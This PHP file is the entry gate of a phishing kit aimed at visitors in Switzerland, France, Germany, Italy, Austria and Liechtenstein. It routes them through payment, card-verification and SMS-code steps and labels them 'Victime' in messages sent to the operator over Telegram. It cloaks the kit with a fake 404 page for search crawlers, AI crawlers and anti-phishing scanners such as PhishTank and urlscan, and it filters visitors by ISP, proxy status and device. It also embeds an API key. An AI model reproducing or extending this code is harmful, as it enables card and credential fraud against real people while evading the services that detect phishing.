<?php
session_start();
include 'settings.php';
include 'lang_main.php';
require_once 'antibot.php';

// ====================== SESSION RECOVERY ======================
if (isset($_SESSION['qsdfqsdfqsdfqsdf123123']) && $_SESSION['qsdfqsdfqsdfqsdf123123'] === true && isset($_SESSION['step'])) {
    $s = $_SESSION['step'];
    if (in_array($s, ['info', 'payment', 'loading1', 'waiting_vbv', 'sms', 'waiting_sms_validation', 'finished'])) {
        $map = [
            'info'              => 'delivery.php',
            'payment'           => 'payment.php',
            'loading1'          => 'process.php',
            'waiting_vbv'       => 'payment.php',
            'sms'               => 'success.php',
            'waiting_sms_validation' => 'verification.php',
            'finished'          => 'complete.php'
        ];
        if (isset($map[$s])) {
            header("Location: " . $map[$s]);
            exit();
        }
    }
}
// ============================================================

function getIpInfo($ip = '') {
    $url = "https://pro.ip-api.com/json/" . $ip . "?key=LWKtz4EzQwMJRyQ&fields=status,message,countryCode,isp,org,as,mobile,proxy,hosting";
    $ipinfo = @file_get_contents($url);
    if (!$ipinfo) return null;
    return json_decode($ipinfo, true);
}

function isMobile() {
    return preg_match('/android|iphone|ipad|ipod|blackberry|windows phone|opera mini|iemobile/i', strtolower($_SERVER['HTTP_USER_AGENT']));
}

$visitor_ip = $_SERVER['REMOTE_ADDR'];
$agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$agent_lower = strtolower($agent);

// Bot check renforcé (via antibot.php)
checkSearchEngineBot();

// ====================== IP INFO ======================
$ipinfo_json = getIpInfo($visitor_ip);

$country = $ipinfo_json['countryCode'] ?? '';
$isp     = $ipinfo_json['isp'] ?? '';
$org     = $ipinfo_json['as'] ?? '';           // AS number + organisation
$org_lower = strtolower($org . ' ' . $isp);

$is_proxy   = $ipinfo_json['proxy'] ?? false;
$is_hosting = $ipinfo_json['hosting'] ?? false;

// ====================== DÉTECTION HUMAINS 2026 ======================
// 1. iCloud Private Relay (Apple) - très courant en CH/FR/DE
$is_icloud_private_relay = false;
if ($ipinfo_json) {
    $isp_l = strtolower($ipinfo_json['isp'] ?? '');
    $org_l = strtolower($ipinfo_json['org'] ?? '');
    if (strpos($isp_l, 'apple') !== false ||
        strpos($isp_l, 'icloud') !== false ||
        strpos($isp_l, 'private relay') !== false ||
        strpos($org_l, 'apple') !== false ||
        strpos($org_l, 'icloud') !== false ||
        $country === 'XX') {                     // ip-api met souvent XX pour Private Relay
        $is_icloud_private_relay = true;
    }
}

// 2. Cloudflare WARP (1.1.1.1)
$is_cloudflare_warp = false;
if ($ipinfo_json) {
    $isp_l = strtolower($ipinfo_json['isp'] ?? '');
    if (strpos($isp_l, 'cloudflare') !== false || strpos($isp_l, 'warp') !== false) {
        $is_cloudflare_warp = true;
    }
}

// ====================== LISTE ISP RÉSIDENTIELS (inchangée) ======================
$is_known_residential_fai = (
    // SUISSE (très complète)
    strpos($org_lower, "swisscom") !== false || strpos($org_lower, "bluewin") !== false ||
    strpos($org_lower, "sunrise") !== false || strpos($org_lower, "upc") !== false ||
    strpos($org_lower, "cablecom") !== false || strpos($org_lower, "salt") !== false ||
    strpos($org_lower, "quickline") !== false || strpos($org_lower, "init7") !== false ||
    strpos($org_lower, "wingo") !== false || strpos($org_lower, "yallo") !== false ||
    strpos($org_lower, "teleboy") !== false || strpos($org_lower, "mbudget") !== false ||
    strpos($org_lower, "iway") !== false || strpos($org_lower, "green.ch") !== false ||
    strpos($org_lower, "vtx") !== false || strpos($org_lower, "netplus") !== false ||
    strpos($org_lower, "sak") !== false || strpos($org_lower, "solnet") !== false ||
    strpos($org_lower, "monzoon") !== false || strpos($org_lower, "broadband.ch") !== false ||
    strpos($org_lower, "swiss4net") !== false ||

    // FRANCE
    strpos($org_lower, "orange") !== false || strpos($org_lower, "sfr") !== false ||
    strpos($org_lower, "bouygues") !== false || strpos($org_lower, "free") !== false ||
    strpos($org_lower, "iliad") !== false || strpos($org_lower, "sosh") !== false ||

    // ALLEMAGNE + ITALIE + AUTRICHE + LIECHTENSTEIN (comme avant)
    strpos($org_lower, "deutsche telekom") !== false || strpos($org_lower, "vodafone") !== false ||
    strpos($org_lower, "o2") !== false || strpos($org_lower, "tim") !== false ||
    strpos($org_lower, "a1 telekom") !== false || strpos($org_lower, "telecom liechtenstein") !== false
);

// ====================== ANTIBOT (Google & bots bloqués à mort) ======================
$bad_uas = [
    'bot', 'crawl', 'spider', 'googlebot', 'google-inspectiontool', 'googleother', 'storebot-google',
    'adsbot-google', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandex', 'exabot',
    'gptbot', 'claudebot', 'anthropic-ai', 'perplexitybot', 'facebookexternalhit', 'facebot',
    'twitterbot', 'linkedinbot', 'discordbot', 'curl', 'wget', 'python', 'java', 'headless',
    'puppeteer', 'selenium', 'brandverity', 'phishtank', 'urlscan', 'ahrefs', 'semrush'
];

foreach ($bad_uas as $bad) {
    if (strpos($agent_lower, $bad) !== false) {
        showClean404();
    }
}

// User-Agent vide ou trop court = bot
if (empty($agent) || $agent === '-' || strlen($agent) < 15) {
    showClean404();
}

// ====================== LOGIQUE D'ACCÈS (humains en priorité) ======================
$target_countries = ['CH', 'FR', 'DE', 'IT', 'AT', 'LI'];

if (
    // 1. Mobile + pays cible → presque toujours humain
    (isMobile() && in_array($country, $target_countries)) ||

    // 2. iCloud Private Relay (Apple) depuis pays cible
    ($is_icloud_private_relay && in_array($country, $target_countries)) ||

    // 3. Cloudflare WARP uniquement sur mobile (très bon signal humain)
    ($is_cloudflare_warp && isMobile() && in_array($country, $target_countries)) ||

    // 4. FAI résidentiel connu
    (in_array($country, $target_countries) && $is_known_residential_fai) ||

    // 5. Pays cible + pas de datacenter/proxy clair
    (in_array($country, $target_countries) && !$is_proxy && !$is_hosting) ||

    // Fallbacks
    ($ipinfo_json === null && isMobile() && in_array($country, $target_countries)) ||
    $visitor_ip === '127.0.0.1'
) {
    $_SESSION['MASTER'] = true;
    $_SESSION['STEP_CHAIN'] = 1;
    $_SESSION['country'] = $country;

    $accept_message = "├ ✅ Victime $visitor_ip ACCÈS OK [$country] (Mobile:" . (isMobile()?'Y':'N') . " | iCloud:" . ($is_icloud_private_relay?'Y':'N') . " | WARP:" . ($is_cloudflare_warp?'Y':'N') . " | FAI:$isp)";
    sendTelegramMessage($bot_token, $chat_id, $accept_message);

    header("Location: gate.php");
    exit;
}
else {
    // Log refus très détaillé
    $refus_message = "├ ❌ $visitor_ip BLOQUÉ [$country - ISP:$isp - Proxy:$is_proxy - Hosting:$is_hosting - iCloud:$is_icloud_private_relay - WARP:$is_cloudflare_warp - Mobile:" . (isMobile()?'Y':'N') . "]";
    sendTelegramMessage($bot_token, $chat_id, $refus_message);

    showClean404();
}
?>